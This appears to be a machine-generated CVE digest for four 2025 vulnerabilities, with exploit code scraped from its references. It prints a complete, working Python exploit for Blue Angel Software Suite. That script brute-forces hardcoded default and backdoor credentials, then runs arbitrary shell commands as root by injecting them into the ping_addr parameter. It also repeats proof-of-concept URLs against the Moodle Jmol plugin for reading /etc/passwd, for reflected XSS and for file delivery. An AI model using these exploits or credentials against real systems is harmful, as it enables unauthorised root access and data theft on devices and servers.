                   (&#039;root&#039;,&#039;Admin@tbroad&#039;),
                   (&#039;root&#039;,&#039;superuser&#039;),
                   (&#039;user&#039;,&#039;user&#039;) ,
                   (&#039;guest&#039;,&#039;guest&#039;),
                   ]
 
   for i in range(len(creds_common)):
      postdata=[(&#039;action&#039;,&#039;login_authentication&#039;),
               (&#039;redirect_action&#039;,&#039;sysinfo_page&#039;),
               (&#039;login_username&#039;,creds_common[i][0]),
               (&#039;login_password&#039;,creds_common[i][1]),
               (&#039;B1&#039;,&#039;Login&#039;)
               ]

      res = requests.post(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi&#039;,data=postdata)

      if &#039;Set-Cookie&#039; in res.headers:
         cookie = res.headers.get(&#039;Set-Cookie&#039;)
         print &#039;[+] LOGGED IN WITH CREDENTIALS  &#039; + str(creds_common[i][0] + &#039; : &#039; + creds_common[i][1]) 
         execute_cmd(target,port,cookie,command)  
         return True


def execute_cmd(target,port,cookie,cmd):

   print &#039;[+] EXECUTING COMMAND&#039;
   new_headers = ({&#039;User-Agent&#039;:&#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)&#039;,
                 &#039;Referer&#039;: target,
                 &#039;Cookie&#039;: cookie
                })
   res = requests.get(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi?action=pingtest_update&amp;ping_addr=127.0.0.1;&#039; + cmd + &#039;&amp;B1=PING&#039;,headers=new_headers)
   res_lines = res.text.splitlines()
   result = []
   copy = False

   for line in res_lines:

      if &#039;round-trip min/avg/max&#039; in line:
         copy = True
      elif &#039;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&#039; in line: 
         copy = False
      elif copy == True:
         result.append(line)

   print(&#039;[+] COMMAND RESPONSE&#039;)
   print(&#039;------------------------------------------&#039;)

   for r in result:
      print r
   print(&#039;------------------------------------------&#039;)


def main():

   if len(sys.argv) &lt; 4:
      print &#039;[-] 3 ARGS: TARGET PORT SHELL_COMMAND&#039;
      sys.exit()
   
   target = sys.argv[1]   
   port = sys.argv[2]
   command = sys.argv[3]
   if not check_login(target,port,command):
      print &#039;[-] COULD NOT FIND VALID CREDENTIALS&#039;
      
if __name__ == &quot;__main__&quot;:
    main()
            

================================================================================


CVE ID: CVE-2025-34033
Published: 2025-06-24T01:15:24.493
Modified: 2025-07-09T19:09:18.207
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
An OS command injection vulnerability exists in the Blue Angel Software Suite running on embedded Linux devices via the ping_addr parameter in the webctrl.cgi script. The application fails to properly sanitize input before passing it to the system-level ping command. An authenticated attacker can inject arbitrary commands by appending shell metacharacters to the ping_addr parameter in a crafted GET request to /cgi-bin/webctrl.cgi?action=pingtest_update. The command's output is reflected in the application's web interface, enabling attackers to view results directly. Default and backdoor credentials can be used to access the interface and exploit the issue. Successful exploitation results in arbitrary command execution as the root user.

References (3):
  1. https://vulncheck.com/advisories/5vtechnologies-blue-angel-command-injection [Third Party Advisory]
  2. https://www.exploit-db.com/exploits/46792 [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/raw/46792 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/46792 ---
<code class="language-py" style="white-space: pre-wrap;"># Exploit Title: Blue Angel Software Suite - Authenticated Command Execution
# Google Dork: N/A
# Date: 02/05/2019
# Exploit Author: Paolo Serracino 
# Vendor Homepage: http://www.5vtechnologies.com
# Software Link: N/A
# Version: All
# Tested on: Embedded Linux OS
# CVE : N/A
# Description: Blue Angel Software Suite, an application that runs on embedded devices for VOIP/SIP services is vulnerable to an authenticated 
# command execution in ping command. All default accounts can be used to login and achieve command execution, including the guest one. 
# Moreover there&#039;s another account, defined in the local file device.dat, that provides an apparently &quot;backdoor&quot; account.
# A list of these accounts is hardcoded in the script.

#/usr/bin/python
import sys
import requests


def check_sw(target,port):

  res = requests.get(target + &#039;:&#039; + port)

  if &#039;/cgi-bin/webctrl.cgi?action=index_page&#039; in res.text:
     return True
  else:
     print &quot;[-] DOES NOT LOOK LIKE THE PAGE WE&#039;RE LOOKING FOR&quot;
     return False

def check_login(target,port,command):

   if not check_sw(target,port):
      sys.exit()

   creds_common = [(&#039;blueangel&#039;,&#039;blueangel&#039;), #the &quot;backdoor&quot; account
                   (&#039;root&#039;,&#039;abnareum10&#039;),
                   (&#039;root&#039;,&#039;Admin@tbroad&#039;),
                   (&#039;root&#039;,&#039;superuser&#039;),
                   (&#039;user&#039;,&#039;user&#039;) ,
                   (&#039;guest&#039;,&#039;guest&#039;),
                   ]
 
   for i in range(len(creds_common)):
      postdata=[(&#039;action&#039;,&#039;login_authentication&#039;),
               (&#039;redirect_action&#039;,&#039;sysinfo_page&#039;),
               (&#039;login_username&#039;,creds_common[i][0]),
               (&#039;login_password&#039;,creds_common[i][1]),
               (&#039;B1&#039;,&#039;Login&#039;)
               ]

      res = requests.post(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi&#039;,data=postdata)

      if &#039;Set-Cookie&#039; in res.headers:
         cookie = res.headers.get(&#039;Set-Cookie&#039;)
         print &#039;[+] LOGGED IN WITH CREDENTIALS  &#039; + str(creds_common[i][0] + &#039; : &#039; + creds_common[i][1]) 
         execute_cmd(target,port,cookie,command)  
         return True


def execute_cmd(target,port,cookie,cmd):

   print &#039;[+] EXECUTING COMMAND&#039;
   new_headers = ({&#039;User-Agent&#039;:&#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)&#039;,
                 &#039;Referer&#039;: target,
                 &#039;Cookie&#039;: cookie
                })
   res = requests.get(target + &#039;:&#039; + port + &#039;/cgi-bin/webctrl.cgi?action=pingtest_update&amp;ping_addr=127.0.0.1;&#039; + cmd + &#039;&amp;B1=PING&#039;,headers=new_headers)
   res_lines = res.text.splitlines()
   result = []
   copy = False

   for line in res_lines:

      if &#039;round-trip min/avg/max&#039; in line:
         copy = True
      elif &#039;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&#039; in line: 
         copy = False
      elif copy == True:
         result.append(line)

   print(&#039;[+] COMMAND RESPONSE&#039;)
   print(&#039;------------------------------------------&#039;)

   for r in result:
      print r
   print(&#039;------------------------------------------&#039;)


def main():

   if len(sys.argv) &lt; 4:
      print &#039;[-] 3 ARGS: TARGET PORT SHELL_COMMAND&#039;
      sys.exit()
   
   target = sys.argv[1]   
   port = sys.argv[2]
   command = sys.argv[3]
   if not check_login(target,port,command):
      print &#039;[-] COULD NOT FIND VALID CREDENTIALS&#039;
      
if __name__ == &quot;__main__&quot;:
    main()
            

================================================================================


CVE ID: CVE-2025-34032
Published: 2025-06-24T01:15:24.350
Modified: 2025-07-09T19:09:33.977
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A reflected cross-site scripting (XSS) vulnerability exists in the Moodle LMS Jmol plugin version 6.1 and prior via the data parameter in jsmol.php. The application fails to properly sanitize user input before embedding it into the HTTP response, allowing an attacker to execute arbitrary JavaScript in the victim's browser by crafting a malicious link. This can be used to hijack user sessions or manipulate page content.

References (4):
  1. https://vulncheck.com/advisories/moodle-lms-jmol-plugin-xss [Third Party Advisory]
  2. https://www.dionach.com/moodle-jmol-plugin-multiple-vulnerabilities/ [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/46881 [Exploit, Third Party Advisory]
  4. https://www.exploit-db.com/exploits/46881 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/46881 ---
<code class="language-txt" style="white-space: pre-wrap;"># Exploit Title: Moodle filter_jmol multiple vulnerabilities (Directory Traversal and XSS)
# Date: 20 May 2019
# Exploit Author: Dionach Ltd
# Exploit Author Homepage: https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
# Software Link: https://moodle.org/plugins/filter_jmol
# Version: &lt;=6.1
# Tested on: Debian

The Jmol/JSmol plugin for the Moodle Learning Management System displays chemical structures in Moodle using Java and JavaScript. The plugin implements a PHP server-side proxy in order to load third party resources bypassing client-side security restrictions. This PHP proxy script calls the function file_get_contents() on unvalidated user input.

This makes Moodle instances with this plugin installed vulnerable to directory traversal and server-side request forgery in the default PHP setup, and if PHP&#039;s &quot;expect&quot; wrapper is enabled, also to remote code execution. Other parameters in the plugin are also vulnerable to reflected cross-site scripting. Note that authentication is not required to exploit these vulnerabilities.

The JSmol Moodle plugin was forked from the JSmol project, where the directory traversal and server-side request forgery vulnerability was partially fixed in 2015.

* Plugin: https://moodle.org/plugins/pluginversions.php?plugin=filter_jmol
* Note on functionality: https://github.com/geoffrowland/moodle-filter_jmol/blob/master/js/jsmol/php/jsmol.php#L14
* Vulnerability announcement: https://sourceforge.net/p/jmol/mailman/message/33627649/
* Partial fix: https://sourceforge.net/p/jsmol/code/1004/

This issue is tracked at the following URLs:
https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
https://tracker.moodle.org/browse/CONTRIB-7516

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C

== Proof of Concept ==

1. Directory traversal
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&amp;query=file:///etc/passwd
2. Reflected cross-site scripting
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&amp;mimetype=text/html
http://&lt;moodle&gt;/filter/jmol/iframe.php?_USE=%22};alert(%27XSS%27);//
3. Malware distribution
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;encoding=base64&amp;data=UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA%3D%3D&amp;filename=empty.zip
            

================================================================================


CVE ID: CVE-2025-34031
Published: 2025-06-24T01:15:23.340
Modified: 2025-07-09T19:09:45.097
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A path traversal vulnerability exists in the Moodle LMS Jmol plugin version 6.1 and prior via the query parameter in jsmol.php. The script directly passes user input to the file_get_contents() function without proper validation, allowing attackers to read arbitrary files from the server's filesystem by crafting a malicious query value. This vulnerability can be exploited without authentication and may expose sensitive configuration data, including database credentials.

References (4):
  1. https://vulncheck.com/advisories/moodle-lms-jmol-plugin-path-traversal [Third Party Advisory]
  2. https://www.dionach.com/moodle-jmol-plugin-multiple-vulnerabilities/ [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/46881 [Exploit, Third Party Advisory]
  4. https://www.exploit-db.com/exploits/46881 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/46881 ---
<code class="language-txt" style="white-space: pre-wrap;"># Exploit Title: Moodle filter_jmol multiple vulnerabilities (Directory Traversal and XSS)
# Date: 20 May 2019
# Exploit Author: Dionach Ltd
# Exploit Author Homepage: https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
# Software Link: https://moodle.org/plugins/filter_jmol
# Version: &lt;=6.1
# Tested on: Debian

The Jmol/JSmol plugin for the Moodle Learning Management System displays chemical structures in Moodle using Java and JavaScript. The plugin implements a PHP server-side proxy in order to load third party resources bypassing client-side security restrictions. This PHP proxy script calls the function file_get_contents() on unvalidated user input.

This makes Moodle instances with this plugin installed vulnerable to directory traversal and server-side request forgery in the default PHP setup, and if PHP&#039;s &quot;expect&quot; wrapper is enabled, also to remote code execution. Other parameters in the plugin are also vulnerable to reflected cross-site scripting. Note that authentication is not required to exploit these vulnerabilities.

The JSmol Moodle plugin was forked from the JSmol project, where the directory traversal and server-side request forgery vulnerability was partially fixed in 2015.

* Plugin: https://moodle.org/plugins/pluginversions.php?plugin=filter_jmol
* Note on functionality: https://github.com/geoffrowland/moodle-filter_jmol/blob/master/js/jsmol/php/jsmol.php#L14
* Vulnerability announcement: https://sourceforge.net/p/jmol/mailman/message/33627649/
* Partial fix: https://sourceforge.net/p/jsmol/code/1004/

This issue is tracked at the following URLs:
https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
https://tracker.moodle.org/browse/CONTRIB-7516

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C

== Proof of Concept ==

1. Directory traversal
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&amp;query=file:///etc/passwd
2. Reflected cross-site scripting
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&amp;mimetype=text/html
http://&lt;moodle&gt;/filter/jmol/iframe.php?_USE=%22};alert(%27XSS%27);//
3. Malware distribution
http://&lt;moodle&gt;/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&amp;encoding=base64&amp;data=UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA%3D%3D&amp;filename=empty.zip
            

================================================================================


CVE ID: CVE-2025-6533
Published: 2025-06-24T00:15:26.397
Modified: 2025-06-26T18:58:14.280
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-287: Improper Authentication
  - CWE-294: CWE-294

Description:
A vulnerability, which was classified as critical, has been found in xxyopen/201206030 novel-plus up to 5.1.3. Affected by this issue is the function ajaxLogin of the file novel-admin/src/main/java/com/java2nb/system/controller/LoginController.java of the component CATCHA Handler. The manipulation leads to authentication bypass by capture-replay. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://blog.0xd00.com/blog/captcha-replay-attack-lead-to-brute-force-protection-bypass
  2. https://blog.0xd00.com/blog/captcha-replay-attack-lead-to-brute-force-protection-bypass#poc
  3. https://vuldb.com/?ctiid.313652
  4. https://vuldb.com/?id.313652
  5. https://vuldb.com/?submit.596481
  6. https://blog.0xd00.com/blog/captcha-replay-attack-lead-to-brute-force-protection-bypass

Attempting to extract code examples from references...

--- Code from https://blog.0xd00.com/blog/captcha-replay-attack-lead-to-brute-force-protection-bypass ---
novel-admin/src/main/java/com/java2nb/system/controller/LoginController.java:80

v5.1.3

<code><span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    R </span><span style="color:#6F42C1;--shiki-dark:#B392F0">ajaxLogin</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(String username, String password,String verify,HttpServletRequest request) {</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        try</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">            //从session中获取随机数</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            String random </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (String) request.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">getSession</span><span style="color:#24292E;--shiki-dark:#E1E4E8">().</span><span style="color:#6F42C1;--shiki-dark:#B392F0">getAttribute</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(RandomValidateCodeUtil.RANDOMCODEKEY);</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">            if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (StringUtils.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">isBlank</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(verify)) {</span></span>
<span class="line highlighted"><span style="color:#D73A49;--shiki-dark:#F97583">                return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> R.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">error</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"请输入验证码"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);         </span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">            if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (random.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">equals</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(verify)) {</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            } </span><span style="color:#D73A49;--shiki-dark:#F97583">else</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> {</span></span>
<span class="line highlighted"><span style="color:#D73A49;--shiki-dark:#F97583">                return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> R.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">error</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"请输入正确的验证码"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);    </span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        } </span><span style="color:#D73A49;--shiki-dark:#F97583">catch</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (Exception </span><span style="color:#E36209;--shiki-dark:#FFAB70">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            logger.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">error</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"验证码校验失败"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, e);</span></span>
<span class="line highlighted"><span style="color:#D73A49;--shiki-dark:#F97583">            return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> R.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">error</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"验证码校验失败"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);           </span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        password </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> MD5Utils.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">encrypt</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(username, password);</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        UsernamePasswordToken token </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> new</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> UsernamePasswordToken</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(username, password);</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        Subject subject </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> SecurityUtils.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">getSubject</span><span style="color:#24292E;--shiki-dark:#E1E4E8">();</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        try</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            subject.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">login</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(token);</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">            return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> R.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">ok</span><span style="color:#24292E;--shiki-dark:#E1E4E8">();</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        } </span><span style="color:#D73A49;--shiki-dark:#F97583">catch</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (AuthenticationException </span><span style="color:#E36209;--shiki-dark:#FFAB70">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">            return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> R.</span><span style="color:#6F42C1;--shiki-dark:#B392F0">error</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"用户或密码错误"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>

================================================================================
